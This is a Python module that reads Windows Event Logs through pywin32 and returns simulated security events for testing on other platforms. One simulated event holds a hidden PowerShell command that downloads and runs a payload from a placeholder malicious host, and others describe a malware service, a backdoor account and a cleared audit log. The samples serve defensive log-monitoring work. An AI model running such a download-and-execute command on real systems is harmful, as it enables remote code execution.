"""
Windows Event Log service.
On Windows: uses win32evtlog (pywin32) for real-time log fetching.
On Linux/Mac (dev/container): returns simulated log entries for testing.
"""
import logging
import platform
import random
from datetime import datetime, timedelta
from typing import Any, Dict, List

logger = logging.getLogger(__name__)

MAX_LOG_LIMIT = 200  # hard cap — prevents system overload

# ── Severity map ────────────────────────────────────────────────────────────
SEVERITY_MAP = {
    1: "Critical",
    2: "Error",
    3: "Warning",
    4: "Information",
    5: "Verbose",
}

# Windows event-type int → label (used by win32evtlog)
EVTTYPE_MAP = {
    1: "Error",
    2: "Warning",
    4: "Information",
    8: "Audit Success",
    16: "Audit Failure",
}

# ── Simulated data for non-Windows ──────────────────────────────────────────
_SIMULATED_EVENTS = [
    {
        "event_id": 4625,
        "source": "Security",
        "channel": "Security",
        "severity": "Warning",
        "message": "An account failed to log on. Subject: SYSTEM. Failure Reason: Unknown username or bad password. Source IP: 192.168.1.105",
        "computer": "WORKSTATION-01",
    },
    {
        "event_id": 4624,
        "source": "Security",
        "channel": "Security",
        "severity": "Information",
        "message": "An account was successfully logged on. Account Name: administrator. Logon Type: 3 (Network). Source IP: 10.0.0.5",
        "computer": "SERVER-DC01",
    },
    {
        "event_id": 4688,
        "source": "Security",
        "channel": "Security",
        "severity": "Information",
        "message": "A new process was created. Process Name: powershell.exe. Command Line: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload')",
        "computer": "WORKSTATION-03",
    },
    {
        "event_id": 7045,
        "source": "System",
        "channel": "System",
        "severity": "Warning",
        "message": "A new service was installed. Service Name: WindowsDefenderUpdate. Service File Name: C:\\Temp\\malware.exe",
        "computer": "SERVER-FILE01",
    },
    {
        "event_id": 4720,
        "source": "Security",
        "channel": "Security",
        "severity": "Warning",
        "message": "A user account was created. New Account: hacker_backdoor. Created by: administrator.",
        "computer": "SERVER-DC01",
    },
    {
        "event_id": 1102,
        "source": "Security",
        "channel": "Security",
        "severity": "Critical",
        "message": "The audit log was cleared. Subject: administrator. This may indicate an attempt to cover tracks.",
        "computer": "WORKSTATION-02",
    },
    {
        "event_id": 4776,
        "source": "Security",
        "channel": "Security",
        "severity": "Warning",
        "message": "The domain controller attempted to validate the credentials for an account. Error Code: 0xC000006A (Wrong Password). Account: svc_backup",
        "computer": "SERVER-DC01",
    },
    {
        "event_id": 4648,
        "source": "Security",
        "channel": "Security",
        "severity": "Information",
        "message": "A logon was attempted using explicit credentials. Account: DOMAIN\\user01 attempted logon as DOMAIN\\admin.",
        "computer": "WORKSTATION-04",
    },
    {
        "event_id": 4672,
        "source": "Security",
        "channel": "Security",
        "severity": "Information",
        "message": "Special privileges assigned to new logon. Account Name: administrator. Privileges: SeDebugPrivilege, SeTcbPrivilege",
        "computer": "SERVER-DC01",
    },
    {
        "event_id": 41,
        "source": "Kernel-Power",
        "channel": "System",
        "severity": "Critical",
        "message": "The system has rebooted without cleanly shutting down first. This error could be caused by unexpected power loss or a blue screen crash.",
        "computer": "SERVER-FILE01",
    },
    {
        "event_id": 5156,
        "source": "Security",
        "channel": "Security",
        "severity": "Information",
        "message": "The Windows Filtering Platform permitted a connection. Application: svchost.exe. Direction: Outbound. Destination IP: 185.220.101.47. Port: 443",
        "computer": "WORKSTATION-01",
    },
    {
        "event_id": 4698,
        "source": "Security",
        "channel": "Security",
        "severity": "Warning",
        "message": "A scheduled task was created. Task Name: \\Microsoft\\Windows\\Update\\MaliciousTask. Command: cmd.exe /c whoami > C:\\Temp\\out.txt",
        "computer": "WORKSTATION-03",
    },
]


def _validate_limit(limit: int) -> int:
    """Clamp limit: min 1, max MAX_LOG_LIMIT."""
    if not isinstance(limit, int) or limit < 1:
        return 10
    return min(limit, MAX_LOG_LIMIT)


def _simulated_entry(event: Dict[str, Any], offset_minutes: int) -> Dict[str, Any]:
    ts = (datetime.utcnow() - timedelta(minutes=offset_minutes)).isoformat() + "Z"
    return {
        "timestamp": ts,
        "event_id": event["event_id"],
        "source": event["source"],
        "channel": event["channel"],
        "computer": event["computer"],
        "severity": event["severity"],
        "message": event["message"],
    }


def _fetch_simulated(channels: List[str], limit: int) -> List[Dict[str, Any]]:
    """Return simulated Windows event log entries filtered by channel."""
    pool = [e for e in _SIMULATED_EVENTS if not channels or e["channel"] in channels]
    if not pool:
        pool = _SIMULATED_EVENTS[:]

    # Shuffle for variety, then pick up to limit
    sample = (pool * ((limit // len(pool)) + 2))[:limit]
    random.shuffle(sample)
    results = []
    for i, ev in enumerate(sample[:limit]):
        results.append(_simulated_entry(ev, offset_minutes=i * 3 + random.randint(0, 5)))

    # Sort newest first
    results.sort(key=lambda x: x["timestamp"], reverse=True)
    return results


def _fetch_windows(channels: List[str], limit: int) -> List[Dict[str, Any]]:
    """Real Windows Event Log fetch via pywin32."""
    try:
        import win32evtlog  # type: ignore
        import win32evtlogutil  # type: ignore
        import winerror  # type: ignore
    except ImportError:
        logger.warning("pywin32 not installed — falling back to simulated logs")
        return _fetch_simulated(channels, limit)

    results: List[Dict[str, Any]] = []
    flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

    for channel in channels:
        if len(results) >= limit:
            break
        try:
            handle = win32evtlog.OpenEventLog(None, channel)
            while len(results) < limit:
                events = win32evtlog.ReadEventLog(handle, flags, 0)
                if not events:
                    break
                for ev in events:
                    if len(results) >= limit:
                        break
                    try:
                        msg = win32evtlogutil.SafeFormatMessage(ev, channel)
                    except Exception:
                        msg = "(message unavailable)"

                    ts = ev.TimeGenerated.isoformat() + "Z" if ev.TimeGenerated else datetime.utcnow().isoformat() + "Z"
                    severity = EVTTYPE_MAP.get(ev.EventType, "Unknown")

                    results.append({
                        "timestamp": ts,
                        "event_id": ev.EventID & 0xFFFF,
                        "source": ev.SourceName or channel,
                        "channel": channel,
                        "computer": ev.ComputerName or "localhost",
                        "severity": severity,
                        "message": (msg or "").strip()[:512],
                    })
            win32evtlog.CloseEventLog(handle)
        except Exception as exc:
            logger.error("Failed reading channel %s: %s", channel, exc)

    results.sort(key=lambda x: x["timestamp"], reverse=True)
    return results[:limit]


# ── Public API ───────────────────────────────────────────────────────────────

def fetch_event_logs(
    channels: List[str] | None = None,
    limit: int = 10,
) -> Dict[str, Any]:
    """
    Fetch Windows Event Logs.
    Args:
        channels: list of log channels e.g. ["Security", "System", "Application"]
        limit: number of entries (1–200)
    Returns dict with `logs`, `count`, `source`, `channels`, `limit`.
    """
    limit = _validate_limit(limit)
    if not channels:
        channels = ["Security", "System", "Application"]

    is_windows = platform.system() == "Windows"
    source = "windows" if is_windows else "simulated"

    if is_windows:
        logs = _fetch_windows(channels, limit)
    else:
        logs = _fetch_simulated(channels, limit)

    logger.info("Fetched %d event log entries (source=%s)", len(logs), source)
    return {
        "logs": logs,
        "count": len(logs),
        "source": source,
        "channels": channels,
        "limit": limit,
        "fetched_at": datetime.utcnow().isoformat() + "Z",
    }
